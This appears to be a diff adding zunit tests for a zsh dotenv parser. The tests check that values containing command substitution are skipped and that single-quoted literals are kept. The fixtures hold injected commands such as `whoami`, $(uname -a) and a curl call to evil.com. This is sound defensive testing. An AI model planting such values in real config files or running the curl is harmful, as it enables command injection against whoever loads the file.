@@ -1,0 +1,164 @@
+#!/usr/bin/env zunit
+
+@setup {
+  typeset -g fixture="$(_create_temp_fixture)"
+  typeset -gA expected_vars=()
+}
+
+@teardown {
+  [[ -f "$fixture" ]] && command rm -f "$fixture"
+  unset DOTENV_TEST_VARS DOTENV_SOURCE_VARS 2>/dev/null
+}
+
+@test 'skip dangerous backtick command substitution' {
+  > "$fixture" <<'EOF'
+# Should be skipped
+DANGEROUS_BACKTICK=`whoami`
+EOF
+
+  _parse_dotenv_test "$fixture"
+
+  assert "DOTENV_TEST_VARS" var_same_as "expected_vars"
+}
+
+@test 'skip dangerous subshell command substitution' {
+  > "$fixture" <<'EOF'
+# Should be skipped
+DANGEROUS_SUBSHELL=$(date)
+EOF
+
+  _parse_dotenv_test "$fixture"
+
+  assert "DOTENV_TEST_VARS" var_same_as "expected_vars"
+}
+
+@test 'skip nested command substitution in double quotes' {
+  > "$fixture" <<'EOF'
+# Should be skipped
+DANGEROUS_NESTED="prefix_$(echo malicious)_suffix"
+EOF
+
+  _parse_dotenv_test "$fixture"
+
+  assert "DOTENV_TEST_VARS" var_same_as "expected_vars"
+}
+
+@test 'skip multiple words (potential command execution)' {
+  > "$fixture" <<'EOF'
+# Should be skipped - multiple words could execute commands
+BASE_URL=/ echo command run
+EOF
+
+  _parse_dotenv_test "$fixture"
+
+  assert "DOTENV_TEST_VARS" var_same_as "expected_vars"
+}
+
+@test 'allow literal command substitution in single quotes' {
+  > "$fixture" <<'EOF'
+# Single quotes make everything literal - should be parsed
+SAFE_SINGLE_QUOTED='$(this is literal)'
+SAFE_BACKTICK='`also literal`'
+
+# Should also be parsed
+SAFE_VAR=safe_value
+EOF
+
+  expected_vars=(
+    SAFE_SINGLE_QUOTED '$(this is literal)'
+    SAFE_BACKTICK '`also literal`'
+    SAFE_VAR 'safe_value'
+  )
+
+  _parse_dotenv_test "$fixture"
+
+  assert "DOTENV_TEST_VARS" var_same_as "expected_vars"
+}
+
+@test 'skip backticks in unquoted values' {
+  > "$fixture" <<'EOF'
+# Backticks in unquoted context - should be skipped
+DANGEROUS_UNQUOTED=`echo danger`
+EOF
+
+  _parse_dotenv_test "$fixture"
+
+  assert "DOTENV_TEST_VARS" var_same_as "expected_vars"
+}
+
+@test 'skip dollar-paren in unquoted values' {
+  > "$fixture" <<'EOF'
+# Command substitution in unquoted context - should be skipped
+DANGEROUS_UNQUOTED=$(uname -a)
+EOF
+
+  _parse_dotenv_test "$fixture"
+
+  assert "DOTENV_TEST_VARS" var_same_as "expected_vars"
+}
+
+@test 'allow safe dollar signs (variable refs without parens in single quotes)' {
+  > "$fixture" <<'EOF'
+# Dollar signs that don't start command substitution
+SAFE_DOLLARS='$HOME is literal'
+SAFE_PRICE='Cost is $50'
+SAFE_VAR='value$123'
+
+# Should all be parsed
+SAFE_VAR2=safe_value
+EOF
+
+  expected_vars=(
+    SAFE_DOLLARS '$HOME is literal'
+    SAFE_PRICE 'Cost is $50'
+    SAFE_VAR 'value$123'
+    SAFE_VAR2 'safe_value'
+  )
+
+  _parse_dotenv_test "$fixture"
+
+  assert "DOTENV_TEST_VARS" var_same_as "expected_vars"
+}
+
+@test 'skip quoted command substitution' {
+  > "$fixture" <<'EOF'
+HARMLESS_COMMAND="\$(echo)"
+ANOTHER_ONE=$'\x24\x28echo\x29'
+EOF
+
+  _parse_dotenv_test "$fixture"
+
+  assert "DOTENV_TEST_VARS" var_same_as "expected_vars"
+}
+
+@test 'comprehensive security test with mixed safe and dangerous patterns' {
+  > "$fixture" <<'EOF'
+# These should be SKIPPED (dangerous)
+DANGEROUS_BACKTICK=`whoami`
+DANGEROUS_SUBSHELL=$(date)
+DANGEROUS_NESTED="prefix_$(echo malicious)_suffix"
+LOOKS_SAFE=$(curl http://evil.com)
+BASE_URL=/ echo command run
+
+# These should WORK (safe)
+SAFE_BEFORE=safe_value_1
+SAFE_AFTER=safe_value_2
+SAFE_SINGLE_QUOTED='$(this is literal)'
+SAFE_SINGLE_QUOTED2='`also literal`'
+SAFE_DOLLARS='$HOME'
+SAFE_PRICE="$50"
+EOF
+
+  expected_vars=(
+    SAFE_BEFORE 'safe_value_1'
+    SAFE_AFTER 'safe_value_2'
+    SAFE_SINGLE_QUOTED '$(this is literal)'
+    SAFE_SINGLE_QUOTED2 '`also literal`'
+    SAFE_DOLLARS '$HOME'
+    SAFE_PRICE '$50'
+  )
+
+  _parse_dotenv_test "$fixture"
+
+  assert "DOTENV_TEST_VARS" var_same_as "expected_vars"
+}
